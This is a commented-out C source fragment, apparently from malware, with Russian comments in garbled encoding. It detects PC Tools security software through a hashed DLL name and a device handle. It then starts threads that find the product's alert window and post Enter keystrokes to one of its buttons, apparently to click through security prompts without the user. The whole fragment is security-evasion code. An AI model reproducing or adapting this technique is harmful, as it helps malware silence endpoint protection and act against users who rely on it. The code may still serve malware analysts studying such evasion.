// 
// HWND g_hFindWindow;
// HWND g_hFindWindowChild;
// int g_iBtnCnt = 0;
// 
// BOOL CALLBACK EnumChildWinProc(HWND hwnd, LPARAM lParam)
// {
//     wchar_t wszClassName[MAX_PATH];
//     DWORD idThread, idProcess;
//     int code;
// 
//     if (!hwnd) {
//         return TRUE; // Ёто не окно
//     }
// 
//     if (!fnIsWindowVisible(hwnd)) { //полученное окно видимо?
//         return TRUE;
//     }
// 
//     switch(lParam) {
//         case 0:
//             break;
//         case 1:
//             fnGetClassNameW(hwnd, wszClassName, MAX_PATH);
// 
//             if (fnlstrcmpiW(wszClassName, L"AtlAxWinLic80") == 0) {
//                 g_hFindWindowChild = hwnd;
//                 return FALSE;
//             }
//             return TRUE;
//         case 2:
//             fnGetClassNameW(hwnd, wszClassName, MAX_PATH);
// 
//             if (fnlstrcmpiW(wszClassName, L"Button") == 0) {
//                 g_iBtnCnt++;
//                 if (g_iBtnCnt == 2) {
//                     g_hFindWindowChild = hwnd;
//                     idThread = fnGetWindowThreadProcessId(hwnd,&idProcess);
//                     fnAttachThreadInput(fnGetCurrentThreadId(),idThread,0);
// 
//                     code = VK_RETURN;
//                     fnPostMessageA(hwnd, WM_KEYDOWN, code, (int)(fnMapVirtualKeyA(code, 2) << 16) + 1);
//                     fnPostMessageA(hwnd, WM_KEYUP, code, (int)((3 << 30) | (fnMapVirtualKeyA(code, 2) << 16) + 1));
// 
//                     g_iBtnCnt = 0;
//                     return FALSE;
//                 }
// 
//             }
//             return TRUE;
//     }
// 
//     return TRUE;
// }
// 
// BOOL CALLBACK EnumWinProc(HWND hwnd, LPARAM lParam)
// {
//     //    wchar_t wszClassName[MAX_PATH];
// 
//     if (hwnd == NULL) {
//         return TRUE; // Ќе окно.
//     }
//     if (!fnIsWindowVisible(hwnd)) { 
//         return TRUE; // ѕолученное окно не видимо.
//     }
// 
//     fnEnumChildWindows(hwnd,&EnumChildWinProc, 1);
// 
//     if (g_hFindWindowChild != 0) {
//         fnEnumChildWindows(hwnd,&EnumChildWinProc, 2);
//         g_hFindWindow = hwnd;
//         return FALSE;
//     }
// 
//     return TRUE;
// }
// 
// DWORD WINAPI CreateFindThread(LPVOID lpParam)
// {
//     while (1) {
//         g_hFindWindow = NULL;
// 
//         fnEnumWindows(EnumWinProc, 0); 
// 
//         if (g_hFindWindow != NULL) {
//             g_hFindWindowChild = NULL;
//             g_hFindWindow = NULL;
//             break;
//         }
//         fnSleepEx(1000, 0);
//     }
//     return 0;
// }
// 
// #define PCTGMHK_DLL_HASH 0x0a9d34f2
// 
// void ph_detect_pctools()
// {
//     int i;
//     HANDLE hFile;
//     HANDLE hThread;
//     DWORD idThread;
//     wchar_t* dllName;
// 
//     dllName = util_get_current_module_name_w(PCTGMHK_DLL_HASH);
//     
//     if (dllName != NULL) {
//         gHIPSMask |= HIPS_PCTOOLS;
//         INLOG("PC Tools PCTGMhk.dll DLL module detected ", 0);
//     }
//     else {
//         hFile = fnCreateFileW(L"\\\\.\\PCTAppEvent", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
// 
//         if (hFile != INVALID_HANDLE_VALUE) {
//             gHIPSMask |= HIPS_PCTOOLS;
//             fnCloseHandle(hFile);
//         }
//         else {
//             return;
//         }
//     }
// 
//     //2 потока на вс€кий случай.
//     for (i = 0; i < 2; ++i) {
//         hThread = fnCreateThread( NULL, 0, &CreateFindThread, NULL, 0, &idThread);
//         fnSleepEx(1000,0);
//     }
// }
